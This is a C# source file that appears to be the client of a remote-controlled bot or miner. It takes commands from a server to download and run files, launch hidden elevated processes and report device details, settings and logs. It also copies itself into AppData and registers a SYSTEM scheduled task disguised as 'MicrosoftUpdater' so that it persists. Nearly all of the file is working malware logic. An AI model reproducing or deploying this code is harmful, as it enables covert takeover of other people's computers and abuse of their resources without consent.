using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ClientWorker
{
	public class Functions
	{

        public void Start()
        {

        }

        public void Analysis(string answer)
        {
            string head = answer.Split('_')[0];
            List<string> parametrs = new List<string>();
            parametrs.AddRange(answer.Split('_'));
            parametrs.Remove(head);

            switch (head)
            {
                case "GetInfoDevice":
                   SendInfoDevice();
                    Log.Send("SendInfoDevice()");
                    break;

                case "DownlUpd":
                    GetUpd();
                    Log.Send("GetUpd()");
                    break;

                case "DownloadAndRun":
                    foreach (string prm in parametrs)
                    {
                       FileManager.DownloadFileAndRun(prm);
                    }
                    Log.Send("DownloadAndRun()");
                    break;

                case "DownloadFloader":
                    //=====================================================>> Исправить
                    FileManager.DownloadFloader(parametrs[0], parametrs[1]);
                    Log.Send("DownloadFloader()");
                    break;

                case "RunProgram":
                    foreach (string prm in parametrs)
                    {
                        FileManager.RunHideProc(prm);
                    }
                    Log.Send("RunProgram()");
                    break;

                case "GetSettings":
                    SendSetting();
                    Log.Send("SendSetting()");
                    break;

                case "GetLogList":
                    SendLogList();
                    Log.Send("SendLogList()");
                    break;

                case "Reconnect":
                case "":
                    Reconnect();
                    Log.Send("Reconnect()");
                    break;

                default:
                    Log.Send("UnknownCommand" + answer);
                    break;
            }
        }

        public void GetUpd()
        {
            Log.Send("GetUpd()");
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            try
            {
                KillUpdater();
                FtpClient.DownloadF(StartData.updater, folderPath + StartData.floaderNewCopy);
                new Process
                {
                    StartInfo =
                    {
                        FileName = folderPath + StartData.floaderNewCopy + StartData.updater,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas",
                        Arguments = Program.nameProc
                    }
                }.Start();
            }
            catch (Exception ex)
            {
                Log.Send("The start process failed: " + ex.ToString());
            }
        }

        private void KillUpdater()
        {
            foreach (Process process in Process.GetProcessesByName("Updater"))
            {
                process.Kill();
            }

            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            folderPath += StartData.floaderNewCopy;

            File.Delete(folderPath + StartData.updater);
        }
        public void Reconnect()
        {
            Log.Send("Reconnect()");
            try
            {
                Program.netSender.Close();
                Program.netSenderThread.Abort();
            }
            catch
            {

            }

            Program.netSenderThread = new Thread(new ThreadStart(Program.netSender.Start));
            Program.netSenderThread.Start();
        }

        private void SendSetting()
        {
            string message = "StartSetting" + StartData.delimiter+ Service.Properties.Settings.Default.Comp_name + StartData.delimiter +
                Service.Properties.Settings.Default.IsMiner + StartData.delimiter +
                Service.Properties.Settings.Default.Open_sum + StartData.delimiter +
                Service.Properties.Settings.Default.Start_time + StartData.delimiter +
                Service.Properties.Settings.Default.Version + StartData.delimiter + "EndSetting";

            Program.netSender.SendMessage(message);
        }

        private void SendInfoDevice()
        {
            InfoDevice.AskedInfoDevice();

            string message = "StartInfoDevice" + StartData.delimiter;

            List<string> messages = new List<string>();
            messages.AddRange(InfoDevice.GetAllSettings());
            foreach (string s in messages)
            {
                message += s + StartData.delimiter;
            }
            message += "EndInfoDevice";

            Program.netSender.SendMessage(message);
        }
        private void SendLogList()
        {
            NetworkStream stream = Program.netSender.netStream;
            string message= "StartLog"+StartData.delimiter;
            foreach (string s in Log.messages)
            {
                message += s + StartData.delimiter;
            }
            message += "EndLog";
            Program.netSender.SendMessage(message);
        }

        public static void Registration()
        {
            Log.Send("Registration()");
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            CreateTask(folderPath + StartData.floaderNewCopy);
            Proliferation(folderPath);
        }

        public static void Proliferation(string parth)
        {
            Log.Send("Proliferation()");
            parth += StartData.floaderNewCopy;
            string executablePath = Application.ExecutablePath;
            try
            {
                if (!File.Exists(parth + StartData.service))
                {
                    DirectoryInfo directoryInfo = Directory.CreateDirectory(parth);
                    File.Copy(executablePath, parth + StartData.service);
                }
            }
            catch (Exception ex)
            {
                Log.Send("Ошибка копирования :" + ex.Message);
            }
        }

        public static void CreateTask(string fileParth)
        {
            new Process
            {
                StartInfo =
                {
                    FileName = "cmd.exe",
                    Verb = "runas",
                    Arguments = "/C SCHTASKS /Create /RU SYSTEM /SC ONLOGON /TN MicrosoftUpdater /TR " + fileParth + StartData.service,
                    WindowStyle = ProcessWindowStyle.Hidden
                }
            }.Start();
            Log.Send("Задача создана");
        }
    }
}
